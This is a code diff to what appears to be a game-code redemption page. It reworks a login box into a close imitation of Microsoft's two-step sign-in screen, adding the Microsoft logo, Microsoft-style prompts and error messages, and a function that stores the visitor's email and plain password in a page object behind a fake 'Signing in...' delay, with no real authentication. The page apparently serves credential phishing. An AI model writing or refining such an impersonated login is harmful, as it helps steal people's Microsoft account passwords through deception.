@@ -183,24 +183,32 @@
     <!-- CUSTOM LOGIN BOX -->
     <div id="mc-login-section" style="display:none">
       <div class="mc-login-box">
-        <h2>Sign In</h2>
-        <p style="font-size:14px;color:#666;margin-bottom:24px">Sign in with your Microsoft account to continue to Minecraft.</p>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" style="width:108px;margin-bottom:24px" alt="Microsoft">
+        <div style="font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:8px">Sign in</div>
+        <p style="font-size:15px;color:#1b1b1b;margin-bottom:12px">Use your Microsoft account</p>
         
-        <div class="mc-input-group">
-          <label>Email, Phone or Skype</label>
-          <input type="text" class="mc-inp" id="mc-login-email" placeholder="someone@example.com">
-        </div>
-        <div class="mc-input-group">
-          <label>Password</label>
-          <input type="password" class="mc-inp" id="mc-login-pass" placeholder="Password">
-        </div>
+        <div id="mc-login-error" style="color:#e81123;font-size:13px;margin-bottom:12px;display:none"></div>
         
-        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px">
-          <a href="#" style="font-size:12px;color:#0067b8;text-decoration:none">Forgot password?</a>
-          <a href="#" style="font-size:12px;color:#0067b8;text-decoration:none">Create one!</a>
+        <div id="mc-step-email">
+          <input type="text" class="mc-login-inp" id="mc-login-email" placeholder="Email, phone, or Skype">
+          <div style="font-size:13px;color:#1b1b1b;margin:16px 0">
+            No account? <a href="#" style="color:#0067b8;text-decoration:none">Create one!</a>
+          </div>
+          <div style="text-align:right;margin-top:40px">
+            <button class="mc-btn-next" onclick="mcNext()">Next</button>
+          </div>
         </div>
 
-        <button class="mc-btn-primary" onclick="rdDoMcLogin()">Next</button>
+        <div id="mc-step-pass" style="display:none">
+          <div style="font-size:15px;color:#1b1b1b;margin-bottom:8px" id="mc-display-email"></div>
+          <input type="password" class="mc-login-inp" id="mc-login-pass" placeholder="Password">
+          <div style="font-size:13px;color:#1b1b1b;margin:16px 0">
+            <a href="#" style="color:#0067b8;text-decoration:none">Forgot password?</a>
+          </div>
+          <div style="text-align:right;margin-top:40px">
+            <button class="mc-btn-next" onclick="rdDoMcLogin()">Sign in</button>
+          </div>
+        </div>
       </div>
       <div style="text-align:center;margin-top:30px">
         <button onclick="rdBack()" style="background:none;border:none;color:#fff;cursor:pointer;font-weight:600;text-shadow:0 2px 4px rgba(0,0,0,0.5)">← Back to Selection</button>
@@ -300,28 +308,46 @@ function rdGame(g) {
   }
 }
 
+function mcNext() {
+  const email = document.getElementById('mc-login-email').value.trim();
+  const err = document.getElementById('mc-login-error');
+  if (!email || !email.includes('@')) {
+    err.textContent = 'Enter a valid email address, phone number, or Skype name.';
+    err.style.display = 'block';
+    return;
+  }
+  err.style.display = 'none';
+  document.getElementById('mc-step-email').style.display = 'none';
+  document.getElementById('mc-step-pass').style.display = 'block';
+  document.getElementById('mc-display-email').textContent = email;
+}
+
 function rdDoMcLogin() {
   const email = document.getElementById('mc-login-email').value.trim();
   const pass = document.getElementById('mc-login-pass').value.trim();
+  const err = document.getElementById('mc-login-error');
   
-  if (!email || !email.includes('@')) { toast('✕', 'Please enter a valid email'); return; }
-  if (pass.length < 4) { toast('✕', 'Please enter your password'); return; }
+  if (!pass) {
+    err.textContent = 'Please enter the password for your Microsoft account.';
+    err.style.display = 'block';
+    return;
+  }
   
   RD.user = { name: email.split('@')[0], email: email, pass: pass };
   
-  const btn = document.querySelector('.mc-btn-primary');
+  const btn = document.querySelector('#mc-step-pass .mc-btn-next');
+  const originalText = btn.textContent;
   btn.textContent = 'Signing in...';
   btn.disabled = true;
   
   setTimeout(() => {
-    btn.textContent = 'Next';
+    btn.textContent = originalText;
     btn.disabled = false;
     
     if (RD.game === 'mc') {
       document.getElementById('mc-login-section').style.display = 'none';
       document.getElementById('mc-redeem-section').style.display = 'block';
     } else {
-      // Xbox uses standard codebox for now but with the MC background
       document.getElementById('mc-login-section').style.display = 'none';
       rdShowCode();
     }
@@ -334,8 +360,15 @@ function rdBack() {
   document.getElementById('std-ui').style.display = 'block';
   document.getElementById('std-bg').style.display = 'block';
   document.getElementById('std-footer').style.display = 'block';
-  document.querySelector('nav').style.display = 'flex'; // Show main nav again
+  document.querySelector('nav').style.display = 'flex';
   
+  // Reset login steps
+  document.getElementById('mc-step-email').style.display = 'block';
+  document.getElementById('mc-step-pass').style.display = 'none';
+  document.getElementById('mc-login-error').style.display = 'none';
+  document.getElementById('mc-login-email').value = '';
+  document.getElementById('mc-login-pass').value = '';
+
   hide(['rd-rb-plan','rd-codebox','rd-nitro-plan','mc-login-section','mc-redeem-section']); 
   show('rd-s1');
   RD.game = null; RD.plan = null; RD.user = null;
